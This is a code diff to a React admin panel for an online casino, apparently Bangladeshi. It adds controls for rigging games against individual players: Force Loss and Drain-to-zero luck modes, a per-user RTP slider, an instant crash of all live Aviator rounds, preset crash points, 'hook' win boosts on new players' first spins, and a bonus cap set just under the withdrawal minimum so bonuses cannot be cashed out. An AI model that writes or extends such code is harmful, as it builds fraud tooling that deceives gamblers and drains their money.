@@ -57,6 +57,8 @@ export default function AdminDashboard({ onExit }) {
     user,
     settings, 
     updateSetting, 
+    updateSettings,
+    syncGlobalSettingsToSupabase,
     banners,
     addBanner,
     deleteBanner,
@@ -98,7 +100,6 @@ export default function AdminDashboard({ onExit }) {
     deleteNotification,
     adminRole,
     updateAdminRole,
-    updateSettings,
     editUserProfile,
     adminResetPassword,
     adminAdjustBalanceWithReason
@@ -145,11 +146,21 @@ export default function AdminDashboard({ onExit }) {
     setUserModalTab('profile');
     setBalanceEditVal(u.balance?.toString() || '0');
     setUserVipEditVal(Number(u.vip_level || 1));
-    const mode = (u.force_result === 'force_lose' || u.luck_mode === 'drain') 
-      ? 'drain' 
-      : (u.force_result === 'force_win' || u.luck_mode === 'sweetener' ? 'sweetener' : 'controlled');
+    
+    // Support 4 targeted luck modes: 'normal', 'force_win', 'force_loss', 'drain_to_zero'
+    let mode = 'normal';
+    if (u.force_mode === 'drain_to_zero' || u.luck_mode === 'drain_to_zero' || u.force_mode === 'drain' || u.luck_mode === 'drain') {
+      mode = 'drain_to_zero';
+    } else if (u.force_mode === 'force_loss' || u.force_result === 'force_lose') {
+      mode = 'force_loss';
+    } else if (u.force_mode === 'force_win' || u.luck_mode === 'sweetener' || u.force_result === 'force_win') {
+      mode = 'force_win';
+    }
     setUserTargetLuckMode(mode);
-    setUserTargetWinRate(Number(u.custom_win_rate !== undefined ? u.custom_win_rate : (mode === 'drain' ? 5 : mode === 'sweetener' ? 40 : 20)));
+    const effectiveRtp = u.custom_rtp !== undefined && u.custom_rtp !== null 
+      ? Number(u.custom_rtp) 
+      : (u.custom_win_rate !== undefined ? Number(u.custom_win_rate) : (mode === 'drain_to_zero' ? 0 : mode === 'force_loss' ? 5 : mode === 'force_win' ? 65 : 20));
+    setUserTargetWinRate(effectiveRtp);
   }
 
   const defaultAdminPhone = '01403398319 (Personal)';
@@ -212,7 +223,7 @@ export default function AdminDashboard({ onExit }) {
   const [activeTicket, setActiveTicket] = useState(null);
   const [ticketReplyText, setTicketReplyText] = useState('');
 
-  // 7B. Casino Profit & Win Rate Master Control State
+  // 7B. Casino Profit, House Margin & Dynamic Risk Engine Master State
   const [houseMode, setHouseMode] = useState(gameControl?.houseMode || 'high_profit');
   const [globalWinRate, setGlobalWinRate] = useState(gameControl?.globalWinRate || 20);
   const [maxMultiplierCap, setMaxMultiplierCap] = useState(gameControl?.maxMultiplier || 3.5);
@@ -222,6 +233,36 @@ export default function AdminDashboard({ onExit }) {
   const [gameControlSearch, setGameControlSearch] = useState('');
   const [aviatorRigMode, setAviatorRigMode] = useState(gameControl?.aviatorMode || 'standard');
 
+  // Platform Risk & Profit Engine Master Settings State
+  const [signupBonusInput, setSignupBonusInput] = useState(settings?.SIGNUP_BONUS_AMOUNT !== undefined ? Number(settings.SIGNUP_BONUS_AMOUNT) : 50);
+  const [minWithdrawInput, setMinWithdrawInput] = useState(settings?.MIN_WITHDRAWAL_AMOUNT !== undefined ? Number(settings.MIN_WITHDRAWAL_AMOUNT) : 200);
+  const [bonusCapInput, setBonusCapInput] = useState(settings?.BONUS_BALANCE_CAP !== undefined ? Number(settings.BONUS_BALANCE_CAP) : 199.00);
+  const [companyRetentionInput, setCompanyRetentionInput] = useState(settings?.COMPANY_PROFIT_RETENTION_PERCENT !== undefined ? Number(settings.COMPANY_PROFIT_RETENTION_PERCENT) : 75);
+  const [hookSpinsCountInput, setHookSpinsCountInput] = useState(settings?.FIRST_SPINS_BOOST_COUNT !== undefined ? Number(settings.FIRST_SPINS_BOOST_COUNT) : 10);
+  const [aviatorNextCrashInput, setAviatorNextCrashInput] = useState(settings?.AVIATOR_NEXT_CRASH !== undefined ? Number(settings.AVIATOR_NEXT_CRASH) : 1.25);
+  const [isEmergencyCrashing, setIsEmergencyCrashing] = useState(false);
+
+  // Server & Provider Global RTPs
+  const [providerRtps, setProviderRtps] = useState({
+    jili: gameControl?.providerRtps?.jili !== undefined ? gameControl.providerRtps.jili : 20,
+    pragmatic: gameControl?.providerRtps?.pragmatic !== undefined ? gameControl.providerRtps.pragmatic : 20,
+    pgsoft: gameControl?.providerRtps?.pgsoft !== undefined ? gameControl.providerRtps.pgsoft : 20,
+    spribe: gameControl?.providerRtps?.spribe !== undefined ? gameControl.providerRtps.spribe : 20,
+    lottery: gameControl?.providerRtps?.lottery !== undefined ? gameControl.providerRtps.lottery : 25
+  });
+
+  // Keep synced if settings change externally
+  useEffect(() => {
+    if (settings) {
+      if (settings.SIGNUP_BONUS_AMOUNT !== undefined) setSignupBonusInput(Number(settings.SIGNUP_BONUS_AMOUNT));
+      if (settings.MIN_WITHDRAWAL_AMOUNT !== undefined) setMinWithdrawInput(Number(settings.MIN_WITHDRAWAL_AMOUNT));
+      if (settings.BONUS_BALANCE_CAP !== undefined) setBonusCapInput(Number(settings.BONUS_BALANCE_CAP));
+      if (settings.COMPANY_PROFIT_RETENTION_PERCENT !== undefined) setCompanyRetentionInput(Number(settings.COMPANY_PROFIT_RETENTION_PERCENT));
+      if (settings.FIRST_SPINS_BOOST_COUNT !== undefined) setHookSpinsCountInput(Number(settings.FIRST_SPINS_BOOST_COUNT));
+      if (settings.AVIATOR_NEXT_CRASH !== undefined) setAviatorNextCrashInput(Number(settings.AVIATOR_NEXT_CRASH));
+    }
+  }, [settings]);
+
   function handleSaveCasinoControls() {
     updateGameControl({
       houseMode,
@@ -230,10 +271,40 @@ export default function AdminDashboard({ onExit }) {
       maxProfitPerRound: Number(maxProfitRound),
       microWinEnabled: microWinActive,
       turnoverMultiplier: Number(turnoverReqMult),
-      aviatorMode: aviatorRigMode
+      aviatorMode: aviatorRigMode,
+      providerRtps
     });
-    setStatusNotice('ক্যাসিনো হাউস মার্জিন ও উইন রেট সফলভাবে আপডেট করা হয়েছে!');
-    setTimeout(() => setStatusNotice(''), 3000);
+    const patch = {
+      SIGNUP_BONUS_AMOUNT: Number(signupBonusInput),
+      MIN_WITHDRAWAL_AMOUNT: Number(minWithdrawInput),
+      BONUS_BALANCE_CAP: Number(bonusCapInput),
+      COMPANY_PROFIT_RETENTION_PERCENT: Number(companyRetentionInput),
+      GLOBAL_HOUSE_EDGE_PERCENT: Number(companyRetentionInput),
+      FIRST_SPINS_BOOST_COUNT: Number(hookSpinsCountInput),
+      AVIATOR_NEXT_CRASH: Number(aviatorNextCrashInput)
+    };
+    if (typeof updateSettings === 'function') {
+      updateSettings(patch);
+    } else if (typeof updateSetting === 'function') {
+      Object.entries(patch).forEach(([k, v]) => updateSetting(k, v));
+    }
+    setStatusNotice('হাউজ মার্জিন, প্রোভাইডার RTP ও প্ল্যাটফর্ম সেটিংস সফলভাবে ক্লাউডে সেভ করা হয়েছে!');
+    setTimeout(() => setStatusNotice(''), 3500);
+  }
+
+  function handleEmergencyCrashNow() {
+    setIsEmergencyCrashing(true);
+    if (typeof updateSetting === 'function') {
+      updateSetting('AVIATOR_FORCE_CRASH_NOW', true);
+    }
+    window.dispatchEvent(new CustomEvent('royalclub_force_aviator_crash'));
+    setStatusNotice('🚨 ইমার্জেন্সি কমান্ড জারি! সমস্ত চলন্ত বিমান অবিলম্বে ক্র্যাশ করানো হয়েছে!');
+    setTimeout(() => {
+      setIsEmergencyCrashing(false);
+      if (typeof updateSetting === 'function') {
+        updateSetting('AVIATOR_FORCE_CRASH_NOW', false);
+      }
+    }, 4000);
   }
 
   // 8. New Banner State
@@ -380,6 +451,43 @@ export default function AdminDashboard({ onExit }) {
     setTimeout(() => setStatusNotice(''), 3000);
   }
 
+  // Format Account Age Helper
+  function formatAccountAge(dateStr) {
+    if (!dateStr) return 'Recently';
+    const now = Date.now();
+    const created = new Date(dateStr).getTime();
+    if (isNaN(created)) return 'Recently';
+    const diffHours = Math.max(0, Math.floor((now - created) / (1000 * 60 * 60)));
+    if (diffHours < 1) {
+      const diffMins = Math.max(1, Math.floor((now - created) / (1000 * 60)));
+      return `Joined ${diffMins}m ago`;
+    }
+    if (diffHours < 24) return `Joined ${diffHours}h ago`;
+    const diffDays = Math.floor(diffHours / 24);
+    return `Joined ${diffDays}d ago`;
+  }
+
+  // Format Last Active Helper
+  function formatLastActive(dateStr, isOnline) {
+    if (isOnline) return 'Online Now';
+    if (!dateStr) return 'Offline';
+    const now = Date.now();
+    const active = new Date(dateStr).getTime();
+    if (isNaN(active)) return 'Offline';
+    const diffMins = Math.max(1, Math.floor((now - active) / (1000 * 60)));
+    if (diffMins < 60) return `Active ${diffMins}m ago`;
+    const diffHours = Math.floor(diffMins / 60);
+    if (diffHours < 24) return `Active ${diffHours}h ago`;
+    return `Active ${Math.floor(diffHours / 24)}d ago`;
+  }
+
+  function isUserOnline(u) {
+    if (u.is_online) return true;
+    if (!u.last_active_at) return false;
+    const diffMs = Date.now() - new Date(u.last_active_at).getTime();
+    return diffMs < 120000;
+  }
+
   // Filtered Users List
   const userList = (allUsers || []).filter(u => {
     if (!searchQuery) return true;
@@ -391,7 +499,33 @@ export default function AdminDashboard({ onExit }) {
     );
   });
 
-  const onlineUsers = userList.filter(u => u.is_online || u.username === 'iueri' || (u.uid && u.uid === '722200'));
+  const onlineUsers = userList.filter(u => isUserOnline(u) || u.username === 'iueri' || (u.uid && u.uid === '722200'));
+  const inGameUsers = userList.filter(u => u.current_game && u.current_game !== 'Lobby' && isUserOnline(u));
+
+  const todayStart = new Date();
+  todayStart.setHours(0, 0, 0, 0);
+
+  const todayDeposits = (transactions || []).filter(t => 
+    t.type === 'deposit' && 
+    (t.status === 'approved' || t.status === 'completed') &&
+    (!t.created_at || new Date(t.created_at) >= todayStart)
+  ).reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
+
+  const todayWithdraws = (transactions || []).filter(t => 
+    (t.type === 'withdraw' || t.type === 'withdrawal') && 
+    (t.status === 'approved' || t.status === 'completed') &&
+    (!t.created_at || new Date(t.created_at) >= todayStart)
+  ).reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
+
+  const totalDepositedAllTime = (allUsers || []).reduce((sum, u) => sum + (Number(u.total_deposited) || 0), 0) || 
+    (transactions || []).filter(t => t.type === 'deposit' && (t.status === 'approved' || t.status === 'completed')).reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
+
+  const totalWithdrawnAllTime = (allUsers || []).reduce((sum, u) => sum + (Number(u.total_withdrawn) || 0), 0) || 
+    (transactions || []).filter(t => (t.type === 'withdraw' || t.type === 'withdrawal') && (t.status === 'approved' || t.status === 'completed')).reduce((sum, t) => sum + (Number(t.amount) || 0), 0);
+
+  const netProfitToday = todayDeposits - todayWithdraws;
+  const profitMarginToday = todayDeposits > 0 ? ((netProfitToday / todayDeposits) * 100).toFixed(1) : '100.0';
+
   const pendingDeposits = (transactions || []).filter(t => t.type === 'deposit' && t.status === 'pending');
   const pendingWithdrawals = (transactions || []).filter(t => (t.type === 'withdraw' || t.type === 'withdrawal') && t.status === 'pending');
   const totalPendingCount = pendingDeposits.length + pendingWithdrawals.length;
@@ -957,20 +1091,47 @@ export default function AdminDashboard({ onExit }) {
                 </button>
               </div>
 
-              {/* 5 Big KPI Metric Cards */}
+              {/* 5 Big Executive KPI Metric Cards */}
               <div className="grid grid-cols-2 lg:grid-cols-5 gap-3 sm:gap-4">
+                {/* 1. Today's Total Deposit */}
                 <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
                   <div className="flex items-center justify-between text-[#8b949e]">
-                    <span className="text-[11px] font-bold uppercase tracking-wider">মোট ইউজার</span>
-                    <Users className="w-4 h-4 text-[#F5BE00]" />
+                    <span className="text-[11px] font-bold uppercase tracking-wider">আজকের ডিপোজিট</span>
+                    <ArrowDownLeft className="w-4 h-4 text-emerald-400" />
                   </div>
                   <div className="flex items-baseline space-x-1.5">
-                    <span className="text-2xl sm:text-3xl font-black text-white font-mono">{userList.length}</span>
-                    <span className="text-xs text-[#8b949e]">জন</span>
+                    <span className="text-2xl sm:text-3xl font-black text-emerald-400 font-mono">৳{todayDeposits.toFixed(0)}</span>
                   </div>
-                  <span className="text-[10px] text-emerald-400 font-bold block">100% Real Users</span>
+                  <span className="text-[10px] text-[#8b949e] font-mono block">মোট: ৳{totalDepositedAllTime.toFixed(0)} (All-Time)</span>
                 </div>
 
+                {/* 2. Today's Total Withdraw */}
+                <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
+                  <div className="flex items-center justify-between text-[#8b949e]">
+                    <span className="text-[11px] font-bold uppercase tracking-wider">আজকের উইথড্র</span>
+                    <ArrowUpRight className="w-4 h-4 text-rose-400" />
+                  </div>
+                  <div className="flex items-baseline space-x-1.5">
+                    <span className="text-2xl sm:text-3xl font-black text-rose-400 font-mono">৳{todayWithdraws.toFixed(0)}</span>
+                  </div>
+                  <span className="text-[10px] text-[#8b949e] font-mono block">মোট: ৳{totalWithdrawnAllTime.toFixed(0)} (All-Time)</span>
+                </div>
+
+                {/* 3. Company Net Profit */}
+                <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
+                  <div className="flex items-center justify-between text-[#8b949e]">
+                    <span className="text-[11px] font-bold uppercase tracking-wider">কোম্পানির নিট লাভ</span>
+                    <TrendingUp className="w-4 h-4 text-[#F5BE00]" />
+                  </div>
+                  <div className="flex items-baseline space-x-1.5">
+                    <span className={`text-2xl sm:text-3xl font-black font-mono ${netProfitToday >= 0 ? 'text-[#F5BE00]' : 'text-rose-400'}`}>
+                      {netProfitToday >= 0 ? '+' : ''}৳{netProfitToday.toFixed(0)}
+                    </span>
+                  </div>
+                  <span className="text-[10px] text-amber-400 font-bold block">{profitMarginToday}% Margin Protected</span>
+                </div>
+
+                {/* 4. Live Online Users */}
                 <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
                   <div className="flex items-center justify-between text-[#8b949e]">
                     <span className="text-[11px] font-bold uppercase tracking-wider">অনলাইন ইউজার</span>
@@ -983,38 +1144,17 @@ export default function AdminDashboard({ onExit }) {
                   <span className="text-[10px] text-emerald-400 font-bold block">● Live Active Now</span>
                 </div>
 
+                {/* 5. In-Game Players */}
                 <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
                   <div className="flex items-center justify-between text-[#8b949e]">
-                    <span className="text-[11px] font-bold uppercase tracking-wider">মোট প্লেয়ার ব্যালেন্স</span>
-                    <Coins className="w-4 h-4 text-yellow-400" />
+                    <span className="text-[11px] font-bold uppercase tracking-wider">গেম খেলছেন</span>
+                    <Gamepad2 className="w-4 h-4 text-yellow-400" />
                   </div>
                   <div className="flex items-baseline space-x-1.5">
-                    <span className="text-2xl sm:text-3xl font-black text-white font-mono">৳{totalCirculatingCoins.toFixed(0)}</span>
+                    <span className="text-2xl sm:text-3xl font-black text-white font-mono">{inGameUsers.length}</span>
+                    <span className="text-xs text-[#8b949e]">জন</span>
                   </div>
-                  <span className="text-[10px] text-yellow-400 font-bold block">In Player Wallets</span>
-                </div>
-
-                <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
-                  <div className="flex items-center justify-between text-[#8b949e]">
-                    <span className="text-[11px] font-bold uppercase tracking-wider">পেন্ডিং রিকোয়েস্ট</span>
-                    <Clock className="w-4 h-4 text-amber-400" />
-                  </div>
-                  <div className="flex items-baseline space-x-1.5">
-                    <span className="text-2xl sm:text-3xl font-black text-white font-mono">{totalPendingCount}</span>
-                    <span className="text-xs text-[#8b949e]">টি</span>
-                  </div>
-                  <span className="text-[10px] text-amber-400 font-bold block">Approval Queue</span>
-                </div>
-
-                <div className="bg-[#161b22] border border-[#21262d] rounded-2xl p-4 space-y-1.5">
-                  <div className="flex items-center justify-between text-[#8b949e]">
-                    <span className="text-[11px] font-bold uppercase tracking-wider">সিস্টেম স্ট্যাটাস</span>
-                    <ShieldCheck className="w-4 h-4 text-[#F5BE00]" />
-                  </div>
-                  <div className="flex items-baseline space-x-1.5">
-                    <span className="text-lg font-black text-emerald-400">OPERATIONAL</span>
-                  </div>
-                  <span className="text-[10px] text-emerald-400 font-bold block">Supabase Live Synced</span>
+                  <span className="text-[10px] text-yellow-400 font-bold block">Aviator / Slots Active</span>
                 </div>
               </div>
 
@@ -1107,89 +1247,194 @@ export default function AdminDashboard({ onExit }) {
                   <table className="w-full text-left text-xs">
                     <thead className="bg-[#0d1117] text-[#8b949e] border-b border-[#21262d] uppercase text-[10px] tracking-wider">
                       <tr>
-                        <th className="p-3.5">User & Device</th>
-                        <th className="p-3.5">UID</th>
-                        <th className="p-3.5">VIP Level</th>
-                        <th className="p-3.5">Wallet Balance (৳)</th>
-                        <th className="p-3.5">Deposits / Payouts</th>
-                        <th className="p-3.5">Turnover Progress</th>
-                        <th className="p-3.5">Activity & Luck</th>
+                        <th className="p-3.5">User & Account Info</th>
+                        <th className="p-3.5">Live Presence & Game</th>
+                        <th className="p-3.5">Balance & Quick Adjust</th>
+                        <th className="p-3.5">Financial Summary</th>
+                        <th className="p-3.5">Turnover</th>
+                        <th className="p-3.5">Luck Manipulation (৪টি মোড)</th>
+                        <th className="p-3.5">Target RTP</th>
                         <th className="p-3.5 text-right">Actions</th>
                       </tr>
                     </thead>
                     <tbody className="divide-y divide-[#21262d]">
-                      {(activeNav === 'online_users' ? onlineUsers : userList).map(u => (
-                        <tr key={u.uid || u.id} className="hover:bg-[#1f242c] transition">
-                          <td className="p-3.5">
-                            <div className="flex items-center space-x-2.5">
-                              <div className="w-8 h-8 rounded-full bg-amber-500/20 text-[#F5BE00] border border-amber-500/30 flex items-center justify-center font-bold text-xs">
-                                {u.username ? u.username[0].toUpperCase() : 'U'}
+                      {(activeNav === 'online_users' ? onlineUsers : userList).map(u => {
+                        const currentMode = u.force_mode || (u.force_result === 'force_lose' || u.luck_mode === 'drain' ? 'drain_to_zero' : (u.force_result === 'force_win' || u.luck_mode === 'sweetener' ? 'force_win' : 'normal'));
+                        const currentRtp = u.custom_rtp !== undefined && u.custom_rtp !== null ? Number(u.custom_rtp) : (u.custom_win_rate !== undefined ? Number(u.custom_win_rate) : (currentMode === 'drain_to_zero' ? 0 : currentMode === 'force_loss' ? 5 : currentMode === 'force_win' ? 65 : 20));
+                        const netUserProfit = (Number(u.total_deposited) || 0) - (Number(u.total_withdrawn) || 0);
+
+                        return (
+                          <tr key={u.uid || u.id} className="hover:bg-[#1f242c] transition">
+                            {/* 1. User & Account Info */}
+                            <td className="p-3.5">
+                              <div className="flex items-center space-x-2.5">
+                                <div className="w-9 h-9 rounded-full bg-amber-500/20 text-[#F5BE00] border border-amber-500/30 flex items-center justify-center font-black text-xs shrink-0 shadow">
+                                  {u.username ? u.username[0].toUpperCase() : 'U'}
+                                </div>
+                                <div className="min-w-0">
+                                  <div className="flex items-center space-x-1.5">
+                                    <span className="font-bold text-white block truncate">{u.username}</span>
+                                    <span className="px-1.5 py-0.2 rounded text-[9px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/20 shrink-0">
+                                      VIP {u.vip_level || 1}
+                                    </span>
+                                  </div>
+                                  <span className="text-[10px] text-[#8b949e] font-mono block">{u.phone || 'No Phone'} • #{u.uid}</span>
+                                  <div className="flex items-center space-x-1.5 text-[9px] text-slate-500 mt-0.5">
+                                    <span className="text-amber-400/80 font-bold">{formatAccountAge(u.created_at)}</span>
+                                    <span>•</span>
+                                    <span className="truncate">{u.device_info || u.device || 'Android'}</span>
+                                  </div>
+                                </div>
                               </div>
-                              <div>
-                                <span className="font-bold text-white block">{u.username}</span>
-                                <span className="text-[10px] text-[#8b949e] font-mono block">{u.phone || 'No Phone'}</span>
-                                <span className="text-[9px] text-slate-500 font-mono block">IP: {u.ip || '103.147.218.44'} • {u.device || 'Android'}</span>
+                            </td>
+
+                            {/* 2. Live Presence & Game */}
+                            <td className="p-3.5">
+                              <div className="space-y-1">
+                                {isUserOnline(u) ? (
+                                  <span className="inline-flex items-center space-x-1.5 text-[10px] font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded-full">
+                                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
+                                    <span>Online Now</span>
+                                  </span>
+                                ) : (
+                                  <span className="text-[10px] text-slate-400 block font-mono">
+                                    {formatLastActive(u.last_active_at, false)}
+                                  </span>
+                                )}
+                                <div className="mt-1">
+                                  <span className="inline-flex items-center space-x-1 text-[10px] font-bold px-2 py-0.5 rounded bg-[#0d1117] border border-[#21262d] text-yellow-300">
+                                    <span>{u.current_game && u.current_game !== 'Lobby' ? `🎮 Playing ${u.current_game}` : '🛋️ In Lobby'}</span>
+                                  </span>
+                                </div>
                               </div>
-                            </div>
-                          </td>
-                          <td className="p-3.5 font-mono text-white">#{u.uid}</td>
-                          <td className="p-3.5">
-                            <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-amber-500/10 text-amber-400 border border-amber-500/20">
-                              VIP {u.vip_level || 1}
-                            </span>
-                          </td>
-                          <td className="p-3.5">
-                            <span className="font-mono font-black text-[#F5BE00] text-sm">
-                              ৳{(u.balance || 0).toFixed(2)}
-                            </span>
-                          </td>
-                          <td className="p-3.5 font-mono text-xs">
-                            <span className="text-emerald-400 block">+৳{(u.total_deposited || 0).toFixed(0)}</span>
-                            <span className="text-rose-400 text-[10px] block">-৳{(u.total_withdrawn || 0).toFixed(0)}</span>
-                          </td>
-                          <td className="p-3.5">
-                            <div className="space-y-1">
-                              <div className="flex justify-between text-[9px] font-mono text-[#8b949e]">
-                                <span>৳{(u.turnover_completed || u.total_wagered || 0).toFixed(0)}</span>
-                                <span>/ ৳{(u.turnover_required || 0).toFixed(0)}</span>
+                            </td>
+
+                            {/* 3. Balance & Quick Adjust (+/-) */}
+                            <td className="p-3.5">
+                              <div className="space-y-1.5">
+                                <span className="font-mono font-black text-[#F5BE00] text-sm block">
+                                  ৳{(u.balance || 0).toFixed(2)}
+                                </span>
+                                <div className="flex items-center space-x-1">
+                                  {[-50, -10, 10, 50].map(amt => (
+                                    <button
+                                      key={amt}
+                                      type="button"
+                                      onClick={() => {
+                                        adjustUserBalance(u.uid, amt);
+                                        setStatusNotice(`ইউজার #${u.uid}-এর ব্যালেন্স ${amt > 0 ? '+' : ''}${amt}৳ অ্যাডজাস্ট করা হয়েছে!`);
+                                        setTimeout(() => setStatusNotice(''), 3000);
+                                      }}
+                                      className={`px-1.5 py-0.5 rounded text-[9px] font-mono font-bold transition cursor-pointer active:scale-95 ${
+                                        amt > 0 
+                                          ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20' 
+                                          : 'bg-rose-500/10 text-rose-400 border border-rose-500/20 hover:bg-rose-500/20'
+                                      }`}
+                                    >
+                                      {amt > 0 ? `+${amt}` : amt}
+                                    </button>
+                                  ))}
+                                </div>
                               </div>
-                              <div className="w-20 bg-slate-800 rounded-full h-1.5 overflow-hidden">
-                                <div 
-                                  className="bg-[#F5BE00] h-full rounded-full"
-                                  style={{ 
-                                    width: `${u.turnover_required > 0 ? Math.min(100, Math.round(((u.turnover_completed || u.total_wagered || 0) / u.turnover_required) * 100)) : 100}%` 
+                            </td>
+
+                            {/* 4. Financial Summary */}
+                            <td className="p-3.5 font-mono text-xs">
+                              <div className="space-y-0.5">
+                                <span className="text-emerald-400 block">+৳{(u.total_deposited || 0).toFixed(0)} <span className="text-[9px] text-[#8b949e]">Dep</span></span>
+                                <span className="text-rose-400 block">-৳{(u.total_withdrawn || 0).toFixed(0)} <span className="text-[9px] text-[#8b949e]">Wdr</span></span>
+                                <span className={`text-[10px] font-bold block pt-0.5 border-t border-[#21262d] ${netUserProfit >= 0 ? 'text-[#F5BE00]' : 'text-rose-400'}`}>
+                                  Net: {netUserProfit >= 0 ? '+' : ''}৳{netUserProfit.toFixed(0)}
+                                </span>
+                              </div>
+                            </td>
+
+                            {/* 5. Turnover */}
+                            <td className="p-3.5">
+                              <div className="space-y-1">
+                                <div className="flex justify-between text-[9px] font-mono text-[#8b949e]">
+                                  <span>৳{(u.current_turnover || u.turnover_completed || u.total_wagered || 0).toFixed(0)}</span>
+                                  <span>/ ৳{(u.required_turnover || u.turnover_required || 0).toFixed(0)}</span>
+                                </div>
+                                <div className="w-20 bg-slate-800 rounded-full h-1.5 overflow-hidden">
+                                  <div 
+                                    className="bg-[#F5BE00] h-full rounded-full"
+                                    style={{ 
+                                      width: `${(u.required_turnover || u.turnover_required) > 0 ? Math.min(100, Math.round(((u.current_turnover || u.turnover_completed || u.total_wagered || 0) / (u.required_turnover || u.turnover_required)) * 100)) : 100}%` 
+                                    }}
+                                  />
+                                </div>
+                              </div>
+                            </td>
+
+                            {/* 6. 1-Click Luck Manipulation (4 Modes) */}
+                            <td className="p-3.5">
+                              <div className="grid grid-cols-2 gap-1 w-44">
+                                {[
+                                  { id: 'normal', label: 'Normal', desc: '২০% RTP', color: 'border-slate-600 text-slate-300' },
+                                  { id: 'force_win', label: 'Force Win', desc: '৬৫% বুস্ট', color: 'border-emerald-500 text-emerald-400' },
+                                  { id: 'force_loss', label: 'Force Loss', desc: '১০০% লস', color: 'border-amber-500 text-amber-400' },
+                                  { id: 'drain_to_zero', label: 'Drain to 0', desc: '০% ড্রেন', color: 'border-rose-500 text-rose-400' }
+                                ].map(m => {
+                                  const isActive = currentMode === m.id;
+                                  return (
+                                    <button
+                                      key={m.id}
+                                      type="button"
+                                      onClick={async () => {
+                                        const nextRtp = m.id === 'drain_to_zero' ? 0 : m.id === 'force_loss' ? 5 : m.id === 'force_win' ? 65 : 20;
+                                        await updateUserLuckMode(u.uid, m.id, nextRtp);
+                                        setStatusNotice(`ইউজার #${u.uid}-এর মোড ${m.label.toUpperCase()} (${nextRtp}% RTP) অ্যাক্টিভ করা হয়েছে!`);
+                                        setTimeout(() => setStatusNotice(''), 3000);
+                                      }}
+                                      className={`px-2 py-1 rounded-lg text-[10px] font-bold transition cursor-pointer flex flex-col items-center justify-center ${
+                                        isActive
+                                          ? 'bg-[#F5BE00] text-slate-950 font-black shadow-md ring-1 ring-yellow-300'
+                                          : `bg-[#0d1117] hover:bg-[#21262d] border ${m.color}`
+                                      }`}
+                                    >
+                                      <span className="leading-tight">{m.label}</span>
+                                      <span className={`text-[8px] ${isActive ? 'text-slate-950 font-black' : 'text-slate-400'}`}>{m.desc}</span>
+                                    </button>
+                                  );
+                                })}
+                              </div>
+                            </td>
+
+                            {/* 7. Target RTP Slider */}
+                            <td className="p-3.5">
+                              <div className="w-24 space-y-1">
+                                <div className="flex justify-between items-center text-[10px]">
+                                  <span className="text-[#8b949e]">RTP:</span>
+                                  <span className="font-mono font-bold text-[#F5BE00]">{currentRtp}%</span>
+                                </div>
+                                <input
+                                  type="range"
+                                  min="0"
+                                  max="100"
+                                  step="1"
+                                  value={currentRtp}
+                                  onChange={async (e) => {
+                                    const val = Number(e.target.value);
+                                    await updateUserLuckMode(u.uid, currentMode, val);
                                   }}
+                                  className="w-full accent-[#F5BE00] cursor-pointer h-1.5 bg-slate-800 rounded-lg"
                                 />
                               </div>
-                            </div>
-                          </td>
-                          <td className="p-3.5">
-                            <div className="space-y-1">
-                              {u.is_online ? (
-                                <span className="inline-flex items-center space-x-1 text-[10px] font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded">
-                                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
-                                  <span>Active Now</span>
-                                </span>
-                              ) : (
-                                <span className="text-[10px] text-slate-500">Offline</span>
-                              )}
-                              <span className={`block text-[9px] font-bold uppercase ${
-                                u.luck_mode === 'drain' ? 'text-rose-400' : u.luck_mode === 'sweetener' ? 'text-amber-400' : 'text-slate-400'
-                              }`}>
-                                Mode: {u.luck_mode || 'Controlled'}
-                              </span>
-                            </div>
-                          </td>
-                          <td className="p-3.5 text-right">
-                            <button
-                              onClick={() => handleSelectUser(u)}
-                              className="px-3 py-1.5 rounded-lg bg-[#F5BE00] hover:bg-yellow-400 text-slate-950 font-black text-xs transition cursor-pointer"
-                            >
-                              Manage User
-                            </button>
-                          </td>
-                        </tr>
-                      ))}
+                            </td>
+
+                            {/* 8. Actions */}
+                            <td className="p-3.5 text-right">
+                              <button
+                                onClick={() => handleSelectUser(u)}
+                                className="px-3 py-1.5 rounded-lg bg-[#F5BE00] hover:bg-yellow-400 text-slate-950 font-black text-xs transition cursor-pointer shadow-sm active:scale-95"
+                              >
+                                Manage User
+                              </button>
+                            </td>
+                          </tr>
+                        );
+                      })}
                     </tbody>
                   </table>
                 </div>
@@ -1323,6 +1568,171 @@ export default function AdminDashboard({ onExit }) {
                   <Check className="w-4 h-4" />
                   <span>Save All Settings</span>
                 </button>
+              </div>
+
+              {/* TOP SECTION: PLATFORM RISK & PROFIT ENGINE SETTINGS */}
+              <div className="bg-[#161b22] border border-amber-500/30 rounded-2xl p-5 space-y-4 shadow-xl">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-[#21262d]">
+                  <div>
+                    <span className="text-[10px] font-black uppercase tracking-wider text-[#F5BE00] bg-amber-500/10 border border-amber-500/20 px-2 py-0.5 rounded-md">
+                      Smart RNG & Retention Master
+                    </span>
+                    <h3 className="text-base font-black text-white mt-1">Platform Risk & Profit Engine Master Settings</h3>
+                    <p className="text-xs text-[#8b949e]">
+                      সাইন-আপ বোনাস, উইথড্রয়াল গেট, ম্যাক্স ব্যালেন্স ক্যাপ এবং ৭৫% হাউজ প্রফিট লকআউট কনফিগ
+                    </p>
+                  </div>
+                  <button
+                    onClick={handleSaveCasinoControls}
+                    className="bg-[#F5BE00] hover:bg-yellow-400 text-slate-950 font-black px-4 py-2 rounded-xl text-xs uppercase tracking-wider shadow active:scale-95 transition cursor-pointer flex items-center space-x-1.5 shrink-0 self-start sm:self-auto"
